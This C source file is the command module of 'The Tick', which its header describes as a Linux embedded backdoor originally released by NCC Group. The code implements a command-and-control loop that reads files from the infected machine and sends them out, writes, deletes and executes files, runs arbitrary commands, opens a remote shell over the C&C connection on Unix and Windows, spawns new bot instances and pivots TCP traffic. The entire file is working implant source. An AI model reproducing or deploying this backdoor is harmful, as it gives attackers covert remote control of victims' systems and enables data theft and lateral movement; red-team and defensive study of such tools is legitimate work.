/*
 * The Tick, a Linux embedded backdoor.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <libgen.h>

#ifdef _WIN32

#include <winsock2.h>
#include <ws2tcpip.h>

// https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/nf-ws2tcpip-getaddrinfo#support-for-getaddrinfo-on-windows-2000-and-older-versions
#include <wspiapi.h>

#include <winbase.h>
#include <processthreadsapi.h>

#define O_SYNC 0

#else

#define O_BINARY 0
#define O_SEQUENTIAL 0

#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/statvfs.h>

#endif

#include "common.h"
#include "shell.h"
#include "tcp.h"
#include "file.h"
#include "parser.h"

#include "command.h"

// Main command loop.
int command_loop(Parser *p)
{
    while (1) {

        // Wait for the next command and read the command block header.
        // This call will block and reconnect if needed.
        parser_wait(p);

        // Now depending on the command ID we will do a number of things.
        switch (p->header.cmd_id)
        {

        // Just a simple no operation command. Useful for testing.
        case CMD_NOP:
            parser_ok(p);
            break;

        // Kill command. Just kill the current process.
        // Global cleanup will be handled by the atexit routine.
        case CMD_SYSTEM_EXIT:
            LOG("User requested termination.\n");
            parser_ok(p);
            parser_close(p);
            return 1;

        // Fork the bot. This will create a new bot instance with a new UUID.
        case CMD_SYSTEM_FORK:
            do_system_fork(p);
            break;

        // Run an interactive shell.
        // This command reuses the C&C connection.
        case CMD_SYSTEM_SHELL:
            do_system_shell(p);
            LOG("Channel reused, reconnecting...\n");
            return 0;

        // Grab a file from the target machine.
        case CMD_FILE_READ:
            do_file_read(p);
            break;

        // Put a file into the target machine.
        case CMD_FILE_WRITE:
            do_file_write(p);
            break;

        // Delete a file in the target machine.
        case CMD_FILE_DELETE:
            do_file_delete(p);
            break;

        // Chmod a file in the target machine.
        case CMD_FILE_CHMOD:
            do_file_chmod(p);
            break;

        // Run a non-interactive command and return the response.
        case CMD_FILE_EXEC:
            do_file_exec(p);
            break;

        // Domain name resolution.
        case CMD_DNS_RESOLVE:
            do_dns_resolve(p);
            break;

        // Simple TCP pivot.
        // This command reuses the C&C connection.
        case CMD_TCP_PIVOT:
            do_tcp_pivot(p);
            LOG("Channel reused, reconnecting...\n");
            return 0;

        // Unsupported command.
        default:
            LOG("Unsupported command: 0x%4x 0x%04x 0x%08x\n", p->header.cmd_id, p->header.cmd_len, p->header.data_len);
            parser_error(p, "not supported");
            break;
        }

        // Skip any unread bytes from the socket until we reach the next command.
        parser_next(p);
    }
}

void do_file_read(Parser *p)
{
    int file = -1;
    char *filename = (char *) &p->buffer;
    struct stat info;

    // Get the filename (first argument).
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

    // Make sure we have read access to the file.
    if (access(filename, F_OK) == -1) {
        LOG("Cannot find %s\n", filename);
        parser_error(p, "file not found");
        return;
    }
    if (access(filename, R_OK) == -1) {
        LOG("Cannot read %s\n", filename);
        parser_error(p, "file not readable");
        return;
    }

    // Open the file.
    file = open(filename, O_RDONLY | O_BINARY | O_SEQUENTIAL);
    if (file < 0) {
        LOG("Cannot open %s\n", filename);
        parser_error(p, "cannot open file");
        return;
    }

    // Make sure the file isn't empty.
    info.st_size = 0;
    stat(filename, &info);
    if (info.st_size == 0) {
        LOG("Cannot stat or empty file %s\n", filename);
        parser_error(p, "cannot stat or empty file");
        return;
    }

    // Make sure the file isn't too big to send.
    if (info.st_size > UINT32_MAX) {
        LOG("File too large %s\n", filename);
        parser_error(p, "file too large");
        return;
    }

    // Send the file in the response.
    // Close the connection if something goes wrong at this point.
    LOG("Reading file %s\n", filename);
    parser_begin_response(p, CMD_STATUS_OK, info.st_size);
    if (copy_stream_file_to_socket(file, p->fd, info.st_size) < 0) {
        parser_close(p);
        LOG("Error sending file (%ld bytes)\n", info.st_size);
    } else {
        LOG("Success (%ld bytes)\n", info.st_size);
    }
    close(file);
}

void do_file_write(Parser *p)
{
    int file = -1;
    int success = -1;
    size_t available = 0;
    char *filename = (char *) &p->buffer;
    char *pathname = NULL;

    // Get the filename (first argument).
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

    // Make sure there's enough space in the target mount point.
    pathname = dirname(filename);
    if (get_free_space(pathname) < (ssize_t) p->header.data_len) {
        parser_error(p, "not enough free space");
        return;
    }

    // Open the file for writing.
    file = open(filename, O_WRONLY | O_CREAT | O_TRUNC | O_SYNC | O_BINARY | O_SEQUENTIAL, 0777);
    if (file < 0) {
        LOG("Cannot open %s\n", filename);
        parser_error(p, "cannot open file");
        return;
    }

    // Fix the mode (in case umask is messing with us).
    chmod(filename, 0777);

    // Save the file data as it comes from the socket.
    LOG("Writing file %s\n", filename);
    success = copy_stream_socket_to_file(p->fd, file, p->header.data_len);
    close(file);
    if (success < 0) {
        LOG("Error receiving file (%d bytes)\n", p->header.data_len);
        parser_error(p, "failed to write file");
        parser_close(p);
    } else {
        LOG("Success (%d bytes)\n", p->header.data_len);
        parser_ok(p);
    }
    p->header.data_len = 0;     // Make sure to reset this counter!
}

void do_file_delete(Parser *p)
{
    char *filename = (char *) &p->buffer;

    // Get the filename (first argument).
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

    // Delete the file.
    if (unlink(filename) < 0) {
        LOG("Error deleting file %s\n", filename);
        parser_error(p, "could not delete");
    } else {
        LOG("Deleted file %s\n", filename);
        parser_ok(p);
    }
}

void do_file_chmod(Parser *p)
{
    char *filename = (char *) &p->buffer;
    uint16_t mode = 0;

    // First two bytes of the first argument are the mode flags in network byte order.
    if (p->header.cmd_len < sizeof(mode) + 2) {
        LOG("Malformed chmod command block\n");
        parser_error(p, "malformed command block");
        parser_close(p);
    }
    if (recv_block(p->fd, (char *) &mode, sizeof(mode)) < 0) {
        LOG("Malformed chmod command block\n");
        parser_error(p, "malformed command block");
        parser_close(p);
    }
    p->header.cmd_len = p->header.cmd_len - sizeof(mode);
    mode = ntohs(mode);

    // The following bytes of the first argument are the filename.
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

    // Chmod the file.
    if (chmod(filename, mode) < 0) {
        LOG("Error changing file mode to %03o %s\n", mode, filename);
        parser_error(p, "could not chmod");
    } else {
        LOG("Changed file mode to %03o %s\n", mode, filename);
        parser_ok(p);
    }
}

void do_file_exec(Parser *p)
{
    char *command = (char *) &p->buffer;
    uint16_t buffer_length = 0;
    char buffer[TICK_CONFIG_BUFFER_SIZE];

    // Get the filename (first argument).
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "command line too long");
        return;
    }

    // Execute the command.
    LOG("Executing: %s\n", command);
    if (run_simple_command(command, (char *) buffer, sizeof(buffer))) {
        LOG("Success\n");
        buffer_length = strlen(buffer);
        parser_begin_response(p, CMD_STATUS_OK, buffer_length);
        send_block(p->fd, buffer, buffer_length);
    } else {
        LOG("Error\n");
        parser_error(p, "could not execute");
    }
}

void do_dns_resolve(Parser *p)
{
    // The first argument is the domain name to resolve.
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "domain name too long");
        return;
    }

    // Resolve the domain name. This must resolve both IPv4 and IPv6.
    //
    // The tricky part here is the GNU libc is a lot smarter for this,
    // but it also introduces a dynamic dependency on libnss on Linux,
    // which makes our binaries non portable - hence we switched to
    // numl libc, which is lean and can be linked statically; but not
    // so "smart", since it actually follows POSIX but that kinda sucks.
    //
    // Second tricky part: on Windows, there is a bug in all of the libc
    // versions I tried (could be Windows, could be mingw?) where the
    // ai_protocol value is always 0 instead of IPPROTO_TCP.
    //
    // Ok, third tricky part. Android has a very buggy implementation
    // of getaddrinfo() that breaks on certain combinations of hints,
    // and these combinations may be dependent on the Android version.
    // The safest bet seems to be using gethostbyname() instead, because
    // that's what the Dalvik code uses.
    // See: https://groups.google.com/g/android-ndk/c/CBirnFPyTIc
    //
    LOG("Resolving domain %s\n", (const char *) &p->buffer);

#ifdef __ANDROID__

    // Android version, using gethostbyname(). Note that this call is
    // racy by design, so we cannot use pthreads. We don't anyway,
    // this is more of a future-proof comment. :)
    struct hostent *hp = gethostbyname((const char *) &p->buffer);
    if (hp == NULL || ! ( (hp->h_addrtype == AF_INET && hp->h_length == 4) || (hp->h_addrtype == AF_INET6 && hp->h_length == 16) )) {
        LOG("Failed to resolve domain\n");
        parser_error(p, "could not resolve domain name");
        return;
    }

    // Calculate the size of the response structure.
    // The response will be an array of structures in this format:
    //      BYTE                family (AF_INET or AF_INET6)
    //      UCHAR[4 or 16]      address (IPv4 or IPv6)
    //
    // Since gethostbyname() can only return *either* IPv4 or IPv6,
    // we know our array size directly from the number of entries.
    char addrtype = hp->h_addrtype;
    uint32_t addrsize = hp->h_length;
    unsigned int entries = 0;
    unsigned int i = 0;
    while (hp->h_addr_list[i] != NULL) {
        entries++;
        i++;
    }
    uint32_t resp_size = entries * (1 + addrsize);
    LOG("Found %d address(es)\n", entries);

    // Send the response.
    parser_begin_response(p, CMD_STATUS_OK, resp_size);
    i = 0;
    while (hp->h_addr_list[i] != NULL) {
        send_block(p->fd, &addrtype, 1);
        send_block(p->fd, (const char *) hp->h_addr_list[i], addrsize);
        i++;
    }

#else

    // All other platforms version, using getaddrinfo().
    int entries = 0;
    uint32_t resp_size = 0;
    struct addrinfo* result = NULL;
    struct addrinfo* res = NULL;
    struct addrinfo hints;
    memset((void *) &hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;    // seems to be ignored on Windows?
#ifndef _WIN32
    hints.ai_flags = AI_ADDRCONFIG | AI_V4MAPPED;   // force gnu libc defaults
            // the above actually works with musl but not standard mingw... :(
            // should be available since Windows Vista
#endif
    if (getaddrinfo((const char *) &p->buffer, NULL, NULL, &result) != 0) {
        LOG("Failed to resolve domain\n");
        parser_error(p, "could not resolve domain name");
        return;
    }

    // Calculate the size of the response structure.
    // The response will be an array of structures in this format:
    //      BYTE                family (AF_INET or AF_INET6)
    //      UCHAR[4 or 16]      address (IPv4 or IPv6)
    entries = 0;
    resp_size = 0;
    for (res = result; res != NULL; res = res->ai_next) {
#ifdef _WIN32
        // ai_protocol is 0 on Windows, seems to be a bug???
        // doesn't matter if it's regular or musl mingw
        if (res->ai_protocol == 0) res->ai_protocol = IPPROTO_TCP;
#endif
        if (res->ai_family == AF_INET && (res->ai_protocol == IPPROTO_TCP)) {
            resp_size += 5;
            entries++;
        } else if (res->ai_family == AF_INET6 && res->ai_protocol == IPPROTO_TCP) {
            resp_size += 17;
            entries++;
        }
    }
    LOG("Found %d address(es)\n", entries);

    // Send the response.
    parser_begin_response(p, CMD_STATUS_OK, resp_size);
    for (res = result; res != NULL; res = res->ai_next) {
        if (res->ai_family == AF_INET && res->ai_protocol == IPPROTO_TCP) {
            send_block(p->fd, (const char *) &res->ai_family, 1);
            send_block(p->fd, (const char *) &((struct sockaddr_in *) res->ai_addr)->sin_addr, 4);
        } else if (res->ai_family == AF_INET6 && res->ai_protocol == IPPROTO_TCP) {
            send_block(p->fd, (const char *) &res->ai_family, 1);
            send_block(p->fd, (const char *) &((struct sockaddr_in6 *) res->ai_addr)->sin6_addr, 16);
        } else {
            // skip other entries
        }
    }

#endif

}

// The following functions are so different between Windows and Linux that it was best to
// just write them two times rather than having an ifdef inside each of them.
#ifndef _WIN32

// Unix versions. So elegant.
// I put them first so you don't judge me too harshly when you read the Windows versions.

void do_system_fork(Parser *p)
{
    // Generate a new UUID for the new instance.
    unsigned char uuid[16];
    uuid4(uuid);

    // Send the new UUID back to the caller.
    parser_begin_response(p, CMD_STATUS_OK, sizeof(uuid));
    send_block(p->fd, uuid, sizeof(uuid));

    // Fork the new instance.
    if (fork() == 0) {

        // We are in the child instance now.
        // Set the new UUID into the Parser object.
        memcpy(p->uuid, uuid, sizeof(uuid));

        // Close the socket object and reconnect.
        // Do not shutdown! The parent process still uses this connection.
        close(p->fd);
        p->fd = -1;
        parser_close(p);
        parser_connect(p);
    }
}

void do_system_shell(Parser *p)
{
    char *shell = NULL;
    char *argv[2];

    // Find out what our shell is.
    shell = getenv("SHELL");

    // If for some odd reason we don't have a SHELL variable, hardcode a default.
    if (shell == NULL) {
        shell = "/bin/sh";
    }

    // Test if the file actually exists and we have execution permission.
    if (access(shell, X_OK) == -1) {
        LOG("Cannot find a shell for the current user\n");
        parser_error(p, "no shell available");
        return;
    }

    // Send the OK status before invoking the shell, since we'll be reusing the channel.
    parser_ok(p);

    // Fork the process.
    if (fork() == 0) {

        // The new process will invoke the shell and pipe it though the socket.
        // The socket timeout values will be disabled.
        setsockopt(p->fd, SOL_SOCKET, SO_RCVTIMEO, NULL, 0);
        setsockopt(p->fd, SOL_SOCKET, SO_SNDTIMEO, NULL, 0);
        dup2(p->fd, 0);
        dup2(p->fd, 1);
        dup2(p->fd, 2);
        argv[0] = shell;
        argv[1] = NULL;
        execvp(shell, argv);

    } else {

        // The parent process will "forget" the connection.
        close(p->fd);
        p->fd = -1;
        parser_close(p);

    }
    LOG("Launched remote shell\n");
}

void do_tcp_pivot(Parser *p)
{
    int sock = -1;
    CMD_TCP_PIVOT_ARGS *pivot = (CMD_TCP_PIVOT_ARGS *) p->buffer;
    struct sockaddr_in sa;

    // Read the TCP pivot options structure.
    if (p->header.cmd_len != sizeof(CMD_TCP_PIVOT_ARGS) || parser_read_first_arg(p, (char *) &p->buffer, sizeof(CMD_TCP_PIVOT_ARGS)) < 0) {
        LOG("Malformed TCP pivot request\n");
        parser_error(p, "malformed request");
        parser_close(p);
        return;
    }

    // Connect to the target IP and port.
    sock = create_socket(AF_INET);
    memset((void *) &sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    if (pivot->from_port != 0) {
        sa.sin_port = pivot->from_port;
        bind(sock, (const struct sockaddr *) &sa, sizeof(sa));
    }
    sa.sin_port = pivot->port;
    memcpy((void *) &sa.sin_addr, (void *) &pivot->ip, sizeof(sa.sin_addr));
    if (pivot->from_port != 0) {
        LOG("Pivoting to %s:%d from port %d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port), ntohs(pivot->from_port));
    } else {
        LOG("Pivoting to %s:%d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port));
    }
    if (connect_socket(sock, (const struct sockaddr *) &sa, sizeof(sa)) < 0) {
        if (pivot->from_port != 0) {
            LOG("Can not connect to %s:%d from port %d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port), ntohs(pivot->from_port));
        } else {
            LOG("Can not connect to %s:%d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port));
        }
        parser_error(p, "connection refused");
        return;
    }

    // Send the OK status before launching the tunnel, since we'll be reusing the channel.
    parser_ok(p);

    // Fork the process twice.
    if (fork() == 0) {
        if (fork() == 0) {

            // The first process will handle the source to destination data.
            copy_socket_stream(p->fd, sock, -1);

        } else {

            // The second process will handle the destination to source data.
            copy_socket_stream(sock, p->fd, -1);

        }

        // Both processes will kill their sockets and quit.
        disconnect_tcp(p->fd);
        disconnect_tcp(sock);
        exit(0);

    } else {

        // Log the event.
        if (pivot->from_port != 0) {
            LOG("Launched TCP tunnel to %s:%d from port %d\n", inet_ntoa(sa.sin_addr), pivot->port, pivot->from_port);
        } else {
            LOG("Launched TCP tunnel to %s:%d\n", inet_ntoa(sa.sin_addr), pivot->port);
        }

        // Close the socket object and reconnect.
        // Do not shutdown! The parent process still uses this connection.
        close(p->fd);
        p->fd = -1;
        parser_close(p);

    }
}

#else

// Windows versions. Enough spaghetti to feed half of Italy.

void do_system_fork(Parser *p)
{
    // While there is a curious fork() hack on Windows, I can't seem to get it working well.
    // The processes are forking alright but they can't seem to use sockets afterwards.
    // There are also some oddities in task manager... this could be useful later! >:)
    //
    // Instead, let's just launch a new process, since for this call it's all the same,
    // The downside is we cannot pass the new UUID back to the caller. :(
    // On the console it will show up just like any other new connection.

    char arguments[1024];
    char name[MAX_PATH];
    char port[32];
    memset(arguments, 0, sizeof(arguments));
    memset(name, 0, sizeof(name));
    memset(port, 0, sizeof(port));
    GetModuleFileNameA(NULL, name, MAX_PATH);
    itoa(p->port, port, 10);
    strcpy(arguments, name);
    strncat(arguments, " ", sizeof(arguments)-1);
    strncat(arguments, p->hostname, sizeof(arguments)-1);
    strncat(arguments, " ", sizeof(arguments)-1);
    strncat(arguments, port, sizeof(arguments)-1);
    strncat(arguments, " ", sizeof(arguments)-1);
    LOG("Launching new instance of bot. Command line: %s\n", arguments);
    if (arguments[strlen(arguments)-1] != ' ') {
        parser_error(p, "internal error");
        return;
    }
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    memset(&pi, 0, sizeof(pi));
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(STARTUPINFO);
    if (CreateProcessA(name, arguments, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi) != 0) {
        parser_ok(p);
    } else {
        parser_error(p, "internal error");
    }
}

typedef struct{
    int sock;
    HANDLE pipe;
} _stub_shell_thread_params;

DWORD WINAPI _stub_pipe_to_socket(LPVOID lpParam);
DWORD WINAPI _stub_socket_to_pipe(LPVOID lpParam);

void do_system_shell(Parser *p)
{
    char shell[MAX_PATH];
    _stub_shell_thread_params *thread_args_1 = NULL;
    _stub_shell_thread_params *thread_args_2 = NULL;
    DWORD success = 0;
    DWORD dwAttrib = INVALID_FILE_ATTRIBUTES;
    HANDLE readStdIn = INVALID_HANDLE_VALUE;
    HANDLE writeStdIn = INVALID_HANDLE_VALUE;
    HANDLE readStdOut = INVALID_HANDLE_VALUE;
    HANDLE writeStdOut = INVALID_HANDLE_VALUE;
    HANDLE hHeap = GetProcessHeap();
    HANDLE hThread_1 = INVALID_HANDLE_VALUE;
    HANDLE hThread_2 = INVALID_HANDLE_VALUE;
    SECURITY_ATTRIBUTES sa;
    PROCESS_INFORMATION pi;
    STARTUPINFO si;

    // Search for PowerShell. If it is available, that will be our remote shell.
    // Note that the path to *all* versions of PowerShell is always the same.
    memset(shell, 0, sizeof(shell));
    if (ExpandEnvironmentStringsA("%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", shell, sizeof(shell)-2)) {
        dwAttrib = GetFileAttributes(shell);
        if ((dwAttrib == INVALID_FILE_ATTRIBUTES || (dwAttrib & FILE_ATTRIBUTE_DIRECTORY))) {
            LOG("PowerShell not found! Tried: %s\n", shell);
            shell[0] = 0;
        }
    } else {
        shell[0] = 0;
    }

    // If PowerShell was not found, try cmd.exe.
    if (shell[0] == 0) {
        if (GetEnvironmentVariable("ComSpec", shell, sizeof(shell)) != 0 && shell[0] != 0) {
            dwAttrib = GetFileAttributes(shell);
            LOG("dwAttrib == 0x%08x\n", dwAttrib);
            if ((dwAttrib == INVALID_FILE_ATTRIBUTES || (dwAttrib & FILE_ATTRIBUTE_DIRECTORY))) {
                LOG("cmd.exe not found! Tried: %s\n", shell);
                shell[0] = 0;
            }
        } else {
            shell[0] = 0;
        }
    }

    // If for some reason the environment variables are missing, hardcode a default.
    if (shell[0] == 0) {
        strcpy(shell, "C:\\Windows\\System32\\cmd.exe");
        dwAttrib = GetFileAttributes(shell);
        if ((dwAttrib == INVALID_FILE_ATTRIBUTES || (dwAttrib & FILE_ATTRIBUTE_DIRECTORY))) {
            LOG("cmd.exe not found! Tried: %s\n", shell);
            shell[0] = 0;
        }
    }

    // If we don't have a shell at this point, give up.
    if (shell[0] == 0) {
        LOG("Cannot find a shell for the current user\n");
        parser_error(p, "no shell available");
        return;
    }

    // The background threads to pipe the shell will need to know the handles.
    // For memory safety we need to use the heap for this.
    thread_args_1 = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(_stub_shell_thread_params));
    thread_args_2 = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(_stub_shell_thread_params));
    if (thread_args_1 == NULL || thread_args_2 == NULL) {
        HeapFree(hHeap, 0, thread_args_1);
        HeapFree(hHeap, 0, thread_args_2);
        parser_error(p, "memory error");
        return;
    }

    // Create the pipes for input and output.
    memset(&sa, 0, sizeof(sa));
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor - NULL;
    success |= CreatePipe(&readStdIn, &writeStdIn, &sa, 0);
    success |= CreatePipe(&readStdOut, &writeStdOut, &sa, 0);
    success |= SetHandleInformation(writeStdIn, HANDLE_FLAG_INHERIT, 0);
    success |= SetHandleInformation(readStdOut, HANDLE_FLAG_INHERIT, 0);
    if ( ! success ) {
        HeapFree(hHeap, 0, thread_args_1);
        HeapFree(hHeap, 0, thread_args_2);
        CloseHandle(readStdIn);
        CloseHandle(writeStdIn);
        CloseHandle(readStdOut);
        CloseHandle(writeStdOut);
        parser_error(p, "error creating pipes");
        return;
    }

    // Create the shell process in suspended mode.
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(STARTUPINFO);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = readStdIn;
    si.hStdOutput = writeStdOut;
    si.hStdError = writeStdOut;
    success |= CreateProcessA(shell, shell, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    if ( ! success ) {
        HeapFree(hHeap, 0, thread_args_1);
        HeapFree(hHeap, 0, thread_args_2);
        CloseHandle(readStdIn);
        CloseHandle(writeStdIn);
        CloseHandle(readStdOut);
        CloseHandle(writeStdOut);
        parser_error(p, "error creating process");
        return;
    }

    // Launch the background threads that will pipe the shell input and output.
    // We will also launch these in suspended state.
    thread_args_1->pipe = readStdOut;
    thread_args_1->sock = p->fd;
    thread_args_2->sock = p->fd;
    thread_args_2->pipe = writeStdIn;
    hThread_1 = CreateThread(NULL, 0, &_stub_pipe_to_socket, thread_args_1, CREATE_SUSPENDED, NULL);
    hThread_2 = CreateThread(NULL, 0, &_stub_socket_to_pipe, thread_args_2, CREATE_SUSPENDED, NULL);
    if (hThread_1 == NULL || hThread_2 == NULL) {
        TerminateProcess(pi.hProcess, 0);
        TerminateThread(hThread_1, 0);
        TerminateThread(hThread_2, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hThread_1);
        CloseHandle(hThread_2);
        HeapFree(hHeap, 0, thread_args_1);
        HeapFree(hHeap, 0, thread_args_2);
        CloseHandle(readStdIn);
        CloseHandle(writeStdIn);
        CloseHandle(readStdOut);
        CloseHandle(writeStdOut);
        parser_error(p, "error creating threads");
        return;
    }

    // Everything seems to be in order at this point.
    // Send the OK status before piping the shell, since we'll be reusing the channel.
    parser_ok(p);

    // Resume execution in all the threads.
    // We don't check for errors here because if there is one, there's nothing to do.
    ResumeThread(pi.hThread);
    ResumeThread(hThread_1);
    ResumeThread(hThread_2);

    // Close the handles we don't need anymore.
    // The heap allocated memory is freed by the threads.
    // The pipe handles are closed when the shell session ends.
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hThread_1);
    CloseHandle(hThread_2);

    // Our protocol parser will "forget" the socket, forcing a reconnect.
    // We do not actually close the socket since it's still in use.
    p->fd = -1;
    parser_close(p);

    // Log the event.
    LOG("Launched remote shell: %s\n", shell);
}

// This function runs in a background thread.
DWORD WINAPI _stub_pipe_to_socket(LPVOID lpParam)
{
    // Fetch the arguments and free the memory.
    _stub_shell_thread_params *thread_args = lpParam;
    HANDLE pipe = thread_args->pipe;
    int sock = thread_args->sock;
    HeapFree(GetProcessHeap(), 0, lpParam);

    // We cannot use our regular helper function to pipe from file to socket,
    // because of type incompatibilities. Here is the same function again,
    // copied and pasted with small changes. This is so ugly. :(
    DWORD block = 0;
    char buffer[1024];
    while (1) {
        if ( ! ReadFile(pipe, buffer, sizeof(buffer), &block, NULL) ) {
            break;
        }
        if (block == 0) {
            break;
        }
        while (block > 0) {
            int tmp = send(sock, buffer, block, 0);
            if (tmp <= 0) {
                break;
            }
            block = block - tmp;
        }
    }

    // Close all the handles and exit.
    shutdown(sock, 2);
    closesocket(sock);
    CloseHandle(pipe);
    ExitThread(0);
}

// This function runs in a background thread.
DWORD WINAPI _stub_socket_to_pipe(LPVOID lpParam)
{
    // Fetch the arguments and free the memory.
    _stub_shell_thread_params *thread_args = lpParam;
    HANDLE pipe = thread_args->pipe;
    int sock = thread_args->sock;
    HeapFree(GetProcessHeap(), 0, lpParam);

    // We cannot use our regular helper function to pipe from socket to file, etc...
    DWORD block = 0;
    char buffer[1024];
    while (1) {
        int tmp_recv = recv(sock, buffer, sizeof(buffer), 0);
        if (tmp_recv <= 0) {
            break;
        }
        block = tmp_recv;
        while (block > 0) {
            DWORD tmp = 0;
            if ( ! WriteFile(pipe, buffer, block, &tmp, NULL) ) {
                break;
            }
            block = block - tmp;
        }
    }

    // Close all the handles and exit.
    shutdown(sock, 2);
    closesocket(sock);
    CloseHandle(pipe);
    ExitThread(0);
}

typedef struct{
    int src;
    int dst;
} _stub_pivot_thread_params;

DWORD WINAPI _stub_copy_socket_stream(LPVOID lpParam);

void do_tcp_pivot(Parser *p)
{
    int sock = -1;
    CMD_TCP_PIVOT_ARGS *pivot = (CMD_TCP_PIVOT_ARGS *) p->buffer;
    struct sockaddr_in sa;
    _stub_pivot_thread_params *thread_args_1 = NULL;
    _stub_pivot_thread_params *thread_args_2 = NULL;
    DWORD success = 0;
    HANDLE hHeap = GetProcessHeap();
    HANDLE hThread_1 = INVALID_HANDLE_VALUE;
    HANDLE hThread_2 = INVALID_HANDLE_VALUE;

    // Read the TCP pivot options structure.
    if (p->header.cmd_len != sizeof(CMD_TCP_PIVOT_ARGS) || parser_read_first_arg(p, (char *) &p->buffer, sizeof(CMD_TCP_PIVOT_ARGS)) < 0) {
        LOG("Malformed TCP pivot request\n");
        parser_error(p, "malformed request");
        parser_close(p);
        return;
    }

    // Connect to the target IP and port.
    sock = create_socket(AF_INET);
    memset((void *) &sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    if (pivot->from_port != 0) {
        sa.sin_port = pivot->from_port;
        bind(sock, (const struct sockaddr *) &sa, sizeof(sa));
    }
    sa.sin_port = pivot->port;
    memcpy((void *) &sa.sin_addr, (void *) &pivot->ip, sizeof(sa.sin_addr));
    if (pivot->from_port != 0) {
        LOG("Pivoting to %s:%d from port %d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port), ntohs(pivot->from_port));
    } else {
        LOG("Pivoting to %s:%d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port));
    }
    if (connect_socket(sock, (const struct sockaddr *) &sa, sizeof(sa)) < 0) {
        if (pivot->from_port != 0) {
            LOG("Can not connect to %s:%d from port %d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port), ntohs(pivot->from_port));
        } else {
            LOG("Can not connect to %s:%d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port));
        }
        parser_error(p, "connection refused");
        return;
    }

    // The background threads will need to know the handles.
    // For memory safety we need to use the heap for this.
    thread_args_1 = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(HANDLE) * 2);
    thread_args_2 = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(HANDLE) * 2);
    if (thread_args_1 == NULL || thread_args_2 == NULL) {
        HeapFree(hHeap, 0, thread_args_1);
        HeapFree(hHeap, 0, thread_args_2);
        shutdown(sock, 2);
        closesocket(2);
        parser_error(p, "memory error");
        return;
    }

    // Create the background threads that will do the pivoting.
    thread_args_1->src = sock;
    thread_args_1->dst = p->fd;
    thread_args_2->src = p->fd;
    thread_args_2->dst = sock;
    hThread_1 = CreateThread(NULL, 0, &_stub_copy_socket_stream, thread_args_1, CREATE_SUSPENDED, NULL);
    hThread_2 = CreateThread(NULL, 0, &_stub_copy_socket_stream, thread_args_2, CREATE_SUSPENDED, NULL);
    if (hThread_1 == NULL || hThread_2 == NULL) {
        TerminateThread(hThread_1, 0);
        TerminateThread(hThread_2, 0);
        CloseHandle(hThread_1);
        CloseHandle(hThread_2);
        HeapFree(hHeap, 0, thread_args_1);
        HeapFree(hHeap, 0, thread_args_2);
        shutdown(sock, 2);
        closesocket(2);
        parser_error(p, "error creating threads");
        return;
    }

    // Everything seems to be in order at this point.
    // Send the OK status before launching the tunnel, since we'll be reusing the channel.
    parser_ok(p);

    // Resume execution in all the threads.
    // We don't check for errors here because if there is one, there's nothing to do.
    ResumeThread(hThread_1);
    ResumeThread(hThread_2);

    // Close the thread handles.
    // The heap allocated memory is freed by the threads.
    // The socket is closed when the pivot connection ends.
    CloseHandle(hThread_1);
    CloseHandle(hThread_2);

    // Log the event.
    if (pivot->from_port != 0) {
        LOG("Launched TCP tunnel to %s:%d from port %d\n", inet_ntoa(sa.sin_addr), pivot->port, pivot->from_port);
    } else {
        LOG("Launched TCP tunnel to %s:%d\n", inet_ntoa(sa.sin_addr), pivot->port);
    }

    // Our protocol parser will "forget" the socket, forcing a reconnect.
    // We do not actually close the socket since it's still in use.
    p->fd = -1;
    parser_close(p);
}

DWORD WINAPI _stub_copy_socket_stream(LPVOID lpParam)
{
    // Fetch the arguments and free the memory.
    _stub_pivot_thread_params *thread_args = lpParam;
    int src = thread_args->src;
    int dst = thread_args->dst;
    HeapFree(GetProcessHeap(), 0, lpParam);

    // Since they're both sockets we can use our handy helper function here. :)
    copy_socket_stream(src, dst, -1);

    // Close all the sockets and exit.
    shutdown(src, 2);
    shutdown(dst, 2);
    closesocket(src);
    closesocket(dst);
    ExitThread(0);
}

